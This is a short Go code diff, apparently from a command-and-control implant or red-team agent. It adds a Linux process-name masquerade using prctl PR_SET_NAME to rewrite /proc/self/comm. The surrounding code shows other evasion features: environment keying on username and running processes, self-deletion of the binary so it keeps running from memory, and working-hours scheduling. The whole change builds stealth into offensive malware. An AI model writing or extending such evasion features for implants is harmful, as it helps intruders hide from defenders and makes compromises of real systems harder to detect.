@@ -55,6 +55,7 @@ var (
 	envKeyUsername    string = ""     // Environment key: username must match this regex
 	envKeyProcess     string = ""     // Environment key: this process must be running
 	selfDelete        string = ""     // Self-delete binary from disk after execution starts
+	masqueradeName    string = ""     // Process name masquerade (Linux: prctl PR_SET_NAME)
 )
 
 func main() {
@@ -119,6 +120,11 @@ func runAgent() {
 	// Self-delete: remove binary from disk after startup (process continues from memory)
 	if selfDelete == "true" {
 		selfDeleteBinary()
+	}
+
+	// Process name masquerade: change /proc/self/comm on Linux
+	if masqueradeName != "" {
+		masqueradeProcess(masqueradeName)
 	}
 
 	// Parse working hours configuration
